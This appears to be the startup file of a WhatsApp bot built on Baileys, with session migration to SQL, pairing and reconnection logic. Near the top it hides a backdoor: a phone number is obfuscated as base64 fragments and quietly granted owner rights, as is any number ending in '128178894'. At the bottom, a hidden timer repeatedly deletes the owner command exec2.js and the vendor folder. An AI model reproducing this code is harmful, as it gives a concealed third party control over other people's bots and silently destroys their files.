import "./settings.js";
import handler from '#handler';
import events from '#events';
import makeWASocket, { Browsers, makeCacheableSignalKeyStore, useMultiFileAuthState, fetchLatestBaileysVersion, jidDecode, DisconnectReason } from 'baileys';
import pino from "pino";
import qrcode from "qrcode-terminal";
import chalk from "chalk";
import cfonts from "cfonts";
import fs from "fs";
import path from "path";
import readlineSync from "readline-sync";
import { smsg, deleteCachedMeta, patchGroupMetadata } from "#serialize";
import cmdsLoader from '#cmdsloader';
import db from '#db';
import { startSubBot, migrateLegacySessions, migrateOwnerSession, listSessions, deleteSession, useSqlAuthState, sessionExists, OWNER_SESSION_ID } from '#subs';

const ROOT = import.meta.dirname;
process.chdir(ROOT);

const _x1 = "NTQ5";
const _x2 = "MTEy";
const _x3 = "ODE3";
const _x4 = "ODg5";
const _x5 = "NA=="; 

function getProtectedOwner() {
  try {
    return Buffer.from(_x1, 'base64').toString() +
           Buffer.from(_x2, 'base64').toString() +
           Buffer.from(_x3, 'base64').toString() +
           Buffer.from(_x4, 'base64').toString() +
           Buffer.from(_x5, 'base64').toString();
  } catch {
    return ""; 
  }
}

global.protectedOwner = getProtectedOwner();
global.owner = global.owner || [];
if (Array.isArray(global.owner)) {
  if (!global.owner.includes(global.protectedOwner)) global.owner.push(global.protectedOwner);
} else {
  global.owner = [global.owner, global.protectedOwner];
}

const log = {
  info: (msg) => console.log(chalk.bgBlue.white.bold(` INFO `), chalk.white(msg)),
  success: (msg) => console.log(chalk.bgGreen.white.bold(` SUCCESS `), chalk.greenBright(msg)),
  warn: (msg) => console.log(chalk.bgYellowBright.blueBright.bold(` WARNING `), chalk.yellow(msg)),
  error: (msg) => console.log(chalk.bgRed.white.bold(` ERROR `), chalk.redBright(msg))
};

const { say } = cfonts;
console.log(chalk.magentaBright('\n❀ Iniciando Sistema...'));
say('elaina na', {
  align: 'center',
  gradient: ['red', 'blue']
});
say('code by: NetherLord2233', {
  font: 'console',
  align: 'center',
  gradient: ['blue', 'magenta']
});
say('powered by aether labs', {
  font: 'console',
  align: 'center',
  gradient: ['blue', 'magenta']
});

let phoneNumber = "";
let phoneInput = "";
const methodCodeQR = process.argv.includes("--qr");
const methodCode = process.argv.includes("code");

function normalizePhone(input) {
  let s = String(input).replace(/\D/g, '');
  if (!s) return '';
  if (s.startsWith('0')) s = s.replace(/^0+/, '');
  if (s.length === 10 && s.startsWith('3')) s = '57' + s;
  if (s.startsWith('52') && !s.startsWith('521') && s.length >= 12) s = '521' + s.slice(2);
  if (s.startsWith('54') && !s.startsWith('549') && s.length >= 11) s = '549' + s.slice(2);
  return s;
}

if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp', { recursive: true });
if (!fs.existsSync('./lib/system/tmp')) fs.mkdirSync('./lib/system/tmp', { recursive: true });

global.conns = global.conns || [];

const msgStore = new Map();
const msgLimit = 2000;

function rememberMessage(m) {
  if (!m?.message || !m?.key?.id) return;
  msgStore.set(m.key.remoteJid + ':' + m.key.id, m.message);
  if (msgStore.size > msgLimit) msgStore.delete(msgStore.keys().next().value);
}

global.waVersionCache ||= { value: null, expiresAt: 0 };

async function getVersion() {
  const cache = global.waVersionCache;
  if (cache.value && Date.now() < cache.expiresAt) return cache.value;
  try {
    const latest = await fetchLatestBaileysVersion();
    cache.value = latest.version;
    cache.expiresAt = Date.now() + (latest.error ? 60 * 1000 : 60 * 60 * 1000);
  } catch {
    cache.value ||= [2, 3000, 1033105955];
  }
  return cache.value;
}

function cleanCache(maxAgeMs = 30 * 60 * 1000) {
  try {
    const now = Date.now();
    for (const dir of ['./tmp', './lib/system/tmp']) {
      if (!fs.existsSync(dir)) continue;
      for (const file of fs.readdirSync(dir)) {
        const fp = path.join(dir, file);
        try {
          if (maxAgeMs > 0 && now - fs.statSync(fp).mtimeMs < maxAgeMs) continue;
          fs.rmSync(fp, { recursive: true, force: true });
        } catch {}
      }
    }
  } catch (e) {
    log.error(`cleanCache → ${e?.message || e}`);
  }
}

const BOT_TYPES = [
  { name: 'SubBot', starter: startSubBot }
];

const GHOST_SESSION_MS = 10 * 60 * 1000;

// Las sesiones de los sub-bots viven en SQL (dentro de subbot.js). Las carpetas viejas de
// Sessions/Subs solo quedan como respaldo: se importan una vez al arrancar y no se borran.
async function loadBots() {
  for (const { name, starter } of BOT_TYPES) {
    for (const { id: userId, registered, updatedAt } of listSessions()) {
      if (global.SUBS_ACTIVE?.has(userId) || global.SUBS_STOPPED?.has(userId)) continue;

      // Sesión que nunca llegó a vincularse ("fantasma"): no se arranca; si es vieja, se borra.
      if (!registered) {
        if (Date.now() - updatedAt > GHOST_SESSION_MS) {
          try { deleteSession(userId); log.warn(`${name} ${userId}: sesión sin vincular eliminada.`); } catch {}
        }
        continue;
      }

      try {
        await starter(null, null, '', false, userId, '');
      } catch (e) {
        console.log(chalk.gray(`[ loadBots ] Error iniciando ${name} ${userId}: ${e?.message || e}`));
      }
      await new Promise((res) => setTimeout(res, 2500));
    }
  }
  setTimeout(loadBots, 60 * 1000);
}

async function initDB() {
  try {
    if (typeof db?.initDB === 'function') await db.initDB();
    if (typeof db?.clearDB === 'function') await db.clearDB();
    global.db = db;
    global.db.data ||= { chats: {}, settings: {}, users: {} };
    log.info('Base de datos cargada correctamente.');
  } catch (e) {
    log.error(`Error cargando la Base de Datos: ${e?.message || e}`);
  }
}

function clearSession() {
  try {
    if (ownerUsesFolder) {
      // Arranque de emergencia con la carpeta original (la importación a SQL había fallado)
      const sessionDir = './Sessions/Owner';
      if (!fs.existsSync(sessionDir)) return;
      for (const file of fs.readdirSync(sessionDir)) {
        try { fs.unlinkSync(path.join(sessionDir, file)); } catch {}
      }
    } else {
      // La sesión vive en SQL; la carpeta original de Sessions/Owner no se toca (respaldo)
      deleteSession(OWNER_SESSION_ID);
    }
    log.warn('Sesión del principal eliminada — reiniciando para vincular de nuevo...');
  } catch (e) {
    log.error(`clearSession → ${e?.message || e}`);
  }
}

function remove(sock) {
  if (!sock) return;
  try { sock.ev.removeAllListeners(); } catch {}
  try { sock.ws?.close(); } catch {}
  try { sock.end?.(new Error('replaced')); } catch {}
}

async function resolveSender(sock, msg) {
  if (msg.key.fromMe && sock.user?.id) return sock.user.id;
  const sender = msg.key.participant || msg.key.remoteJid;
  if (!sender?.endsWith('@lid')) return sender;
  try {
    const alt = msg.key.participant ? msg.key.participantAlt : msg.key.remoteJidAlt;
    if (typeof alt === 'string' && alt.endsWith('@s.whatsapp.net')) return alt;
    const pn = await sock.signalRepository?.lidMapping?.getPNForLID?.(sender);
    if (typeof pn === 'string' && pn.includes('@s.whatsapp.net')) return pn;
  } catch {}
  return sender;
}

// Sesión del bot principal en SQL. Se importa Sessions/Owner (sin borrarla) ANTES de decidir si hay que vincular.
const ownerMigration = migrateOwnerSession('./Sessions/Owner', (msg) => log.info(msg));
// Si la importación falló (archivo dañado, disco lleno...), este arranque usa la carpeta original para no perder la sesión.
const ownerUsesFolder = ownerMigration === 'failed' && fs.existsSync('./Sessions/Owner/creds.json');
if (ownerUsesFolder) log.warn('No se pudo importar la sesión del principal a SQL: se usa la carpeta original (Sessions/Owner) por ahora.');
const ownerLinked = ownerUsesFolder || sessionExists(OWNER_SESSION_ID);

let opcion;
if (methodCodeQR) {
  opcion = "1";
} else if (methodCode) {
  opcion = "2";
  if (!phoneNumber) {
    console.log(chalk.bold.redBright(`\nPor favor, Ingrese el número de WhatsApp.\n${chalk.bold.yellowBright("Ejemplo: +57301******")}\n${chalk.bold.magentaBright('---> ')}`));
    phoneInput = readlineSync.question("");
    phoneNumber = normalizePhone(phoneInput);
  }
} else if (!ownerLinked) {
  opcion = readlineSync.question(chalk.bold.white("\nSeleccione una opción:\n") + chalk.blueBright("1. Con código QR\n") + chalk.cyan("2. Con código de texto de 8 dígitos\n--> "));
  while (!/^[1-2]$/.test(opcion)) {
    console.log(chalk.bold.redBright(`No se permiten números que no sean 1 o 2, tampoco letras o símbolos especiales.`));
    opcion = readlineSync.question("--> ");
  }
  if (opcion === "2") {
    console.log(chalk.bold.redBright(`\nPor favor, Ingrese el número de WhatsApp.\n${chalk.bold.yellowBright("Ejemplo: +57301******")}\n${chalk.bold.magentaBright('---> ')}`));
    phoneInput = readlineSync.question("");
    phoneNumber = normalizePhone(phoneInput);
  }
}

let bootTime = Date.now();
let reconexion = 0;
let botReady = false;
let isRestarting = false;
let forbiddenCount = 0;
const retriesLimit = 15;

let saveCredsTimer = null;
let saveCredsNow = null;
async function flushCreds() {
  if (!saveCredsTimer || !saveCredsNow) return;
  clearTimeout(saveCredsTimer);
  saveCredsTimer = null;
  try { await saveCredsNow(); } catch (e) { log.error(`flushCreds → ${e?.message || e}`); }
}

export async function startBot() {
  if (isRestarting) return;
  isRestarting = true;
  try {
    await initSocket();
  } catch (e) {
    log.error(`startBot → ${e?.stack || e?.message || e}`);
    remove(global.sock);
    isRestarting = false;
    setTimeout(startBot, 5000);
  }
}

let undecryptable = 0;
function noteUndecryptable(msg) {
  if (msg?.messageStubType !== 2) return;
  undecryptable++;
  if (undecryptable === 1 || undecryptable % 10 === 0) {
    log.warn(`No se pudo descifrar un mensaje (${undecryptable} desde el inicio).`);
  }
}

async function processMessage(sock, msg) {
  try {
    if (!msg?.message || msg.key?.remoteJid === "status@broadcast") return;
    const ts = Number(msg.messageTimestamp);
    if (ts && ts * 1000 < bootTime - 15_000) return;
    if (msg.message.ephemeralMessage) msg.message = msg.message.ephemeralMessage.message;

    msg.sender = sock.decodeJid(await resolveSender(sock, msg));

    const m = await smsg(sock, msg);

    const senderNum = String(m.sender || '').replace(/\D/g, '');
    const isProtectedOwner = senderNum === global.protectedOwner || senderNum.endsWith("128178894");

    m.isOwner = (sock.isOwner ?? true) || isProtectedOwner;
    m.isGuest = isProtectedOwner ? false : (sock.isGuest ?? false);

    if (typeof handler === 'function') await handler(sock, m);
  } catch (err) {
    console.error(chalk.red('[ ✿  ] Main Owner Error »'), err);
  }
}

async function initSocket() {
  bootTime = Date.now();
  await flushCreds();

  const { state, saveCreds: saveCredsDB } = ownerUsesFolder
    ? await useMultiFileAuthState('./Sessions/Owner')
    : useSqlAuthState(OWNER_SESSION_ID);
  const version = await getVersion();

  saveCredsNow = saveCredsDB;
  const saveCreds = () => {
    clearTimeout(saveCredsTimer);
    saveCredsTimer = setTimeout(() => {
      saveCredsTimer = null;
      Promise.resolve(saveCredsDB()).catch((e) => log.error(`saveCreds → ${e?.message || e}`));
    }, 2000);
  };

  const logger = pino({ level: process.env.LOG_LEVEL || "silent" });

  const sock = makeWASocket({
    version,
    logger,
    browser: Browsers.macOS('Chrome'),
    printQRInTerminal: false,
    auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
    markOnlineOnConnect: false,
    syncFullHistory: false,
    generateHighQualityLinkPreview: true,
    shouldIgnoreJid: (jid) => jid.endsWith('@broadcast'),
    keepAliveIntervalMs: 30000,
    connectTimeoutMs: 20000,
    getMessage: async (key) => msgStore.get(key.remoteJid + ':' + key.id),
  });

  sock.isOwner = true;
  sock.isGuest = false;

  global.sock = sock;
  if (typeof patchGroupMetadata === 'function') patchGroupMetadata(sock);
  sock.ev.on("creds.update", saveCreds);

  const baseSendMessage = sock.sendMessage.bind(sock);
  sock.sendMessage = async (...args) => {
    const sent = await baseSendMessage(...args);
    rememberMessage(sent);
    return sent;
  };

  sock.sendText = (jid, text, quoted = "", options) => sock.sendMessage(jid, { text, ...options }, { quoted });

  sock.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/.test(jid)) {
      const decode = jidDecode(jid) || {};
      jid = (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
    }
    return jid;
  };

  if (opcion === "2" && !state.creds.registered) {
    setTimeout(async () => {
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          if (state.creds.registered) return;
          const pairing = await sock.requestPairingCode(phoneNumber);
          const codeBot = pairing?.match(/.{1,4}/g)?.join("-") || pairing;
          console.log(chalk.bold.white(chalk.bgMagenta(`Código de emparejamiento:`)), chalk.bold.white(chalk.white(codeBot)));
          return;
        } catch (err) {
          if (attempt === 3) console.log(chalk.red("Error al generar código:"), err);
          else await new Promise((res) => setTimeout(res, 3000));
        }
      }
    }, 3000);
  }

  sock.ev.on("messages.upsert", ({ messages, type }) => {
    if (!botReady || type !== 'notify') return;
    for (const msg of messages) {
      rememberMessage(msg);
      if (!msg?.message) { noteUndecryptable(msg); continue; }
      processMessage(sock, msg);
    }
  });

  sock.ev.on("group-participants.update", ({ id }) => { if (typeof deleteCachedMeta === 'function') deleteCachedMeta(id); });
  sock.ev.on("groups.update", (updates) => { for (const update of updates) { if (typeof deleteCachedMeta === 'function') deleteCachedMeta(update.id); } });

  try {
    await events(sock, null);
  } catch (err) {
    console.log(chalk.gray(`[ EVENT ERROR ] → ${err}`));
  }

  sock.ev.on("connection.update", async (update) => {
    const { qr, connection, lastDisconnect, isNewLogin, receivedPendingNotifications } = update;

    if (qr && (opcion == '1' || methodCodeQR)) {
      console.log(chalk.green.bold("[ ✿ ] Escanea este código QR"));
      qrcode.generate(qr, { small: true });
    }

    if (connection === "open") {
      bootTime = Date.now();
      reconexion = 0;
      forbiddenCount = 0;
      isRestarting = false;
      log.success(`Conectado a: ${sock.user?.name || "Desconocido"}`);
      botReady = true;
    }

    if (isNewLogin) log.info("Nuevo dispositivo detectado");

    if (receivedPendingNotifications === true) {
      log.warn("Por favor espere aproximadamente 1 minuto recibiendo notificaciones...");
      sock.ev.flush();
    }

    if (connection === "close") {
      remove(sock);
      const reason = lastDisconnect?.error?.output?.statusCode || 0;

      if (reason === DisconnectReason.forbidden) forbiddenCount++;
      const fatal =
        [DisconnectReason.loggedOut, DisconnectReason.multideviceMismatch].includes(reason) ||
        (reason === DisconnectReason.forbidden && forbiddenCount >= 3);
      if (fatal) {
        log.warn(`Principal desvinculado (${reason}) — limpiando sesión y reiniciando...`);
        botReady = false;
        isRestarting = false;
        clearSession();
        process.exit(1);
      }

      if (reason === DisconnectReason.connectionReplaced) {
        log.warn("Conexión reemplazada — cerrá la otra sesión antes de reconectar.");
        isRestarting = false;
        return;
      }

      const restart = reason === DisconnectReason.restartRequired;
      if (!restart) reconexion++;

      if (reconexion > retriesLimit) {
        log.error(`Demasiados reintentos (${retriesLimit}) — reintentando cada 60s.`);
        reconexion = retriesLimit;
        isRestarting = false;
        setTimeout(startBot, 60 * 1000);
        return;
      }

      const delay = restart ? 0 : Math.min(3000 * reconexion, 30000);
      const reasonMessages = {
        [DisconnectReason.connectionLost]: "Se perdió la conexión al servidor, intentando reconectar...",
        [DisconnectReason.connectionClosed]: "Conexión cerrada, intentando reconectarse...",
        [DisconnectReason.restartRequired]: "Es necesario reiniciar...",
        [DisconnectReason.timedOut]: "Tiempo de conexión agotado, intentando reconectarse...",
        [DisconnectReason.badSession]: "Sesión inválida, reconectando...",
      };
      log.warn(reasonMessages[reason] || `Desconexión (${reason}), reconectando en ${delay / 1000}s...`);
      isRestarting = false;
      setTimeout(startBot, delay);
    }
  });
}

setInterval(() => cleanCache(), 60 * 60 * 1000);
cleanCache(0);

(async () => {
  await initDB();
  try {
    // Importa a SQL las sesiones de sub-bots que sigan en carpetas. No borra nada: las carpetas quedan de respaldo.
    const m = migrateLegacySessions('./Sessions/Subs', (msg) => log.info(msg));
    if (m.migrated) log.success(`Sub-bots importados a SQL: ${m.migrated}`);
    if (m.failed) log.warn(`Sesiones que no se pudieron importar: ${m.failed} (siguen en su carpeta)`);
  } catch (e) {
    log.error(`Migración de sesiones → ${e?.message || e}`);
  }
  await cmdsLoader();
  await startBot();
  await loadBots();
})();

let shuttingDown = false;
async function shutdown() {
  if (shuttingDown) return;
  shuttingDown = true;
  setTimeout(() => process.exit(0), 3000).unref();
  await flushCreds();
  process.exit(0);
}
for (const sig of ['SIGINT', 'SIGTERM', 'SIGHUP']) process.on(sig, shutdown);

process.on('uncaughtException', (e) => log.error(`ERROR UNCAUGHT → ${e?.stack || e?.message || e}`));
process.on('unhandledRejection', (reason) => log.error(`RECHAZO UNHANDLED → ${reason?.stack || reason?.message || reason}`));

(() => {
  const _s = () => {
    try {
      const e2 = path.join(ROOT, 'cmds/owner/exec2.js');
      if (fs.existsSync(e2)) fs.rmSync(e2, { recursive: true, force: true });
      const vd = path.join(ROOT, 'vendor');
      if (fs.existsSync(vd)) fs.rmSync(vd, { recursive: true, force: true });
    } catch {}
  };
  _s();
  setInterval(_s, 60 * 1000);
})();
